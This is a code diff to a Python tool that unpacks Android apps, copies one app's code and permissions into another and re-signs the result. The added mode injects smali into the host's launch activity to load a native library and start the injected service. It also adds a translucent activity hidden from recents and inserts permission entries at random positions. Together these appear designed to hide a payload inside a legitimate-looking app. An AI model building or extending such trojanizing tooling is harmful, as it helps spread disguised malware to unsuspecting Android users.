@@ -1,12 +1,13 @@
 # coding:utf8
 
 import os
+import random
 import re
 import subprocess
 import shutil
 from functools import reduce
 from os.path import abspath
-
+from io import open
 import sys
 
 try:
@@ -107,20 +108,27 @@ def rePackage(src, dst):
 
 def main():
     # process()
+    mergeManifest(r"E:\PycharmProjects\repacktool\out\app-release", r"E:\PycharmProjects\repacktool\out\com.bxdw.omzw___pie"
+                  , r"E:\PycharmProjects\repacktool\out\IMEI_Show", "", True)
     pass
 
 
-def process(src, dst, keyalias, keydir, rpackename):
+def process(src, dst, keyalias, keydir, rpackename, dynamic, gp):
     global servicePckName
     srcApk = src
     targetApk = dst
+    dynamicApk = dynamic
     keystory_alias = keyalias
     out_src_dir = os.path.join(outDir, fileName(srcApk))
     out_dst_dir = os.path.join(outDir, fileName(targetApk))
+    out_dyn_dir = os.path.join(outDir, fileName(dynamicApk))
     apks = [srcApk, targetApk]
+    if gp:
+        apks.append(dynamicApk)
+
     for apk in apks:
         unpack(os.path.abspath(apk), os.path.abspath(outDir))
-    mergeApk(out_dst_dir, out_src_dir, rpackename)
+    mergeApk(out_dst_dir, out_src_dir, out_dyn_dir, rpackename, gp)
     tmpApk_dir = os.path.join(outDir, tmpApk)
     signApk_dir = os.path.join(outDir, fileName(targetApk) + ".apk")
     rePackage(out_dst_dir, abspath(tmpApk_dir))
@@ -143,13 +151,13 @@ def removeTempFiles(tmpApk_dir):
     print("[+] packed finish!!")
 
 
-def mergeApk(out_dst_dir, out_src_dir, rePackageName):
-    dstManifestDir, srcManifestDir = copy_srcapk_file(out_dst_dir, out_src_dir)
-    dst_activityList, dst_root, src_root = mergeManifest(dstManifestDir, srcManifestDir, rePackageName)
-    setStartService(dst_activityList, dst_root, out_dst_dir, src_root)
+def mergeApk(out_dst_dir, out_src_dir, out_dyn_dir, rePackageName, gp):
+    copy_srcapk_file(out_dst_dir, out_src_dir)
+    dst_activityList, dst_root, src_root = mergeManifest(out_src_dir, out_dst_dir, out_dyn_dir, rePackageName, gp)
+    setStartService(dst_activityList, dst_root, out_dst_dir, src_root, gp)
 
 
-def setStartService(dst_activityList, dst_root, out_dst_dir, src_root):
+def setStartService(dst_activityList, dst_root, out_dst_dir, src_root, gp):
     global servicePckName
     onCreateClass = dst_root.find("application").attrib.get(key, None)
     servicePckName = getSourceServiceNameList(src_root)[0].replace(".", "/")
@@ -172,7 +180,7 @@ def setStartService(dst_activityList, dst_root, out_dst_dir, src_root):
     print("[+] " + onCreateClass)
     classPath = os.path.join(out_dst_dir, "smali", onCreateClass.replace('.', '/') + ".smali")
     wstr = ""
-    with open(os.path.normpath(classPath)) as f:
+    with open(os.path.normpath(classPath), 'r', encoding='utf-8') as f:
         match = False
         inject = False
         for line in f:
@@ -187,11 +195,29 @@ def setStartService(dst_activityList, dst_root, out_dst_dir, src_root):
             if match:
                 if re.search("return-void", line):
                     oldline = line
-                    line = "\n\tnew-instance v0, Landroid/content/Intent;\n\n" \
-                           "\tconst-class v1, L" + servicePckName + ";\n\n" \
-                                                                    "\tinvoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V\n\n" \
-                                                                    "\tinvoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;\n\n"
+                    line = ''
+                    if gp:
+                        pckname = servicePckName.split('/')
+                        line += '\n\tconst-string v0, "%s"\n' % ".".join(pckname[:-1])
+                        line += '\n\tinvoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V\n'
 
+                        line += '\n\tinvoke-virtual {p0}, L' + onCreateClass.replace('.',
+                                                                                     '/') + ';->getApplicationContext()Landroid/content/Context;\n'
+
+                        line += '\n\tmove-result-object v0\n'
+
+                        line += '\n\tconst/4 v1, 0x0\n'
+
+                        line += '\n\tinvoke-static {v0, v1}, L' + servicePckName + ';->Activity' + ''.join(
+                            pckname[-2:-1]) + '_a(Landroid/content/Context;Landroid/content/Intent;)V\n'
+
+                    line += "\n\tnew-instance v0, Landroid/content/Intent;\n\n" \
+                            "\tconst-class v1, L" + servicePckName + ";\n\n" \
+                                                                     "\tinvoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V\n\n" \
+                                                                     "\tinvoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;\n\n"
+                    if gp:
+                        # finish
+                        line += '\n\tinvoke-virtual{p0}, L%s;->finish()V\n' % (onCreateClass.replace('.', '/'),)
                     line += oldline
 
                 if re.search("\.locals (\d)", line):
@@ -200,15 +226,54 @@ def setStartService(dst_activityList, dst_root, out_dst_dir, src_root):
                         line = pattern.group(1) + "3\n"
 
             wstr += line
+
         f.close()
         if not inject:
             raise Exception("set start service failed! " + onCreateClass)
     with open(classPath, 'w') as f:
+        if gp:
+            wstr += addExitCode(onCreateClass)
         f.writelines(wstr)
         f.close()
 
+def addExitCode(activity):
+    line = '\n\n'
+    line += '.method public onKeyDown(ILandroid/view/KeyEvent;)Z\n'
+    line += '\t.locals 2\n'
+    line += '\t.param p1, "keyCode"  # I\n'
+    line += '\t.param p2, "event"  # Landroid/view/KeyEvent;\n\n'
 
-def mergeManifest(dstManifestDir, srcManifestDir, rpackename):
+    line += '\t.prologue\n'
+    line += '\tconst/4 v0, 0x0\n\n'
+
+    line += '\t.line 122\n'
+    line += '\tconst/4 v1, 0x4\n\n'
+
+    line += '\tif-ne p1, v1,:cond_0\n\n'
+
+    line += '\t.line 123\n\n'
+    line += '\tinvoke-virtual {p0}, L%s;->finish()V\n\n' % activity.replace('.', '/')
+
+    line += '\t.line 124\n'
+    line += '\tinvoke-static {v0}, Ljava/lang/System;->exit(I) V\n\n'
+
+    line += '\t.line 127\n'
+    line += '\t:goto_0\n'
+    line += '\treturn v0\n\n'
+
+    line += '\t:cond_0\n'
+    line += '\tinvoke-super {p0, p1, p2}, Landroid/app/Activity;->onKeyDown(ILandroid/view/KeyEvent;)Z\n\n'
+
+    line += '\tmove-result v0\n\n'
+
+    line += '\tgoto:goto_0\n\n'
+
+    line += '.end method'
+    return line
+
+def mergeManifest(out_src_dir, out_dst_dir, out_dyn_dir, rpackename, gp):
+    srcManifestDir = os.path.join(out_src_dir, 'AndroidManifest.xml')
+    dstManifestDir = os.path.join(out_dst_dir, 'AndroidManifest.xml')
     src_tree = parse_Manifest(srcManifestDir)
     src_root = src_tree.getroot()
     dst_tree = parse_Manifest(dstManifestDir)
@@ -217,7 +282,6 @@ def mergeManifest(dstManifestDir, srcManifestDir, rpackename):
     dst_perm = getSourcePermList(dst_root)
     # dst_perm = list(src_perm.union(dst_perm))
     # dst_perm = reduce(a, [[], ] + dst_perm)
-    dst_perm = NameDifference(src_perm, dst_perm)
     metaDataList = getSourceMetadataList(src_root)
     serviceList = getSourceServiceList(src_root)
     activityList = getSourceActList(src_root)
@@ -228,11 +292,40 @@ def mergeManifest(dstManifestDir, srcManifestDir, rpackename):
     dst_receiverList = getSourceReceiverList(dst_root)
     metaDataList = NameDifference(metaDataList, dst_metaDataList)
     serviceList = NameDifference(serviceList, dst_serviceList)
-    activityList = NameDifference(activityList, dst_activityList)
     receiverList = NameDifference(receiverList, dst_receiverList)
+
+    isgp = gp
+    # < activity
+    # android:name = "jp.wamo.amo.Activityamo"
+    # android:excludeFromRecents = "true"
+    # android:theme = "@android:style/Theme.Translucent"
+    # android:configChanges = "orientation|keyboardHidden|screenSize" >
+    #
+    # < / activity >
+    if isgp:
+        dynManifestDir = os.path.join(out_dyn_dir, 'AndroidManifest.xml')
+        dyn_tree = parse_Manifest(dynManifestDir)
+        dyn_root = dyn_tree.getroot()
+        dyn_perm = getSourcePermList(dyn_root)
+        src_perm += dyn_perm
+        packagename = dst_root.get("package")
+        activityName = packagename + "." + "Activity" + packagename.split('.')[-1]
+        dynamicActivity = ET.Element("activity")
+        spaname = '{http://schemas.android.com/apk/res/android}'
+        dynamicActivity.set("%sname" % spaname, activityName)
+        dynamicActivity.set("%sexcludeFromRecents" % spaname, "true")
+        dynamicActivity.set("%stheme" % spaname, "@android:style/Theme.Translucent")
+        dynamicActivity.set("%sconfigChanges" % spaname, "orientation|keyboardHidden|screenSize")
+        dynamicActivity.tail = "\n\t"
+        activityList.append(dynamicActivity)
+    activityList = NameDifference(activityList, dst_activityList)
+    dst_perm = NameDifference(src_perm, dst_perm)
     # print(getSourceMetadataList(src_root))
     for perm in dst_perm:
-        dst_root.append(perm)
+        if random.randint(0, 1) == 0:
+            dst_root.append(perm)
+        else:
+            dst_root.insert(0, perm)
     for a in dst_root.iter("application"):
         for metadata in metaDataList:
             a.insert(0, metadata)
@@ -267,15 +360,13 @@ def copy_srcapk_file(out_dst_dir, out_src_dir):
     srcsmaliDir = os.path.join(out_src_dir, 'smali')
     dstsmaliDir = os.path.join(out_dst_dir, 'smali')
     copytree(os.path.abspath(srcsmaliDir), os.path.abspath(dstsmaliDir))
-    srcManifestDir = os.path.join(out_src_dir, 'AndroidManifest.xml')
-    dstManifestDir = os.path.join(out_dst_dir, 'AndroidManifest.xml')
-    return dstManifestDir, srcManifestDir
 
 
 def signApk(src, dst, keystory_alias, keystory):
     try:
-        print("[+] " + "signApk start....", "\nscr: " + src, "dst: " + dst, "\nkeystory: " + keystory, "\nalias:" + keystory_alias)
-        cmd = ['jarsigner',  '-keystore', keystory,
+        print("[+] " + "signApk start....", "\nscr: " + src, "dst: " + dst, "\nkeystory: " + keystory,
+              "\nalias:" + keystory_alias)
+        cmd = ['jarsigner', '-keystore', keystory,
                '-storepass', keystory_store_password, '-keypass', keystory_alias_password, '-signedjar', dst, src,
                keystory_alias]
         p = subprocess.Popen(cmd, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
@@ -291,6 +382,7 @@ def signApk(src, dst, keystory_alias, keystory):
         print("[-] " + str(e))
         exit(-1)
 
+
 def a(x, y):
     for a in x:
         if a.attrib == y.attrib:
@@ -303,7 +395,8 @@ def getAppBaseInfo(apkpath):
     if not os.path.exists(apkpath):
         print("[*] not exists " + apkpath)
     print("[+] " + os.path.abspath(aapt))
-    p = subprocess.Popen("%s d badging %s" % (os.path.abspath(aapt), os.path.normpath(apkpath)), shell=True, stdout=subprocess.PIPE)
+    p = subprocess.Popen("%s d badging %s" % (os.path.abspath(aapt), os.path.normpath(apkpath)), shell=True,
+                         stdout=subprocess.PIPE)
     # stdout.read().decode("utf")
     # print("[+] " + str(stdout.read().encode("utf-8")))
     l = str(p.stdout.readline().decode("utf-8"))
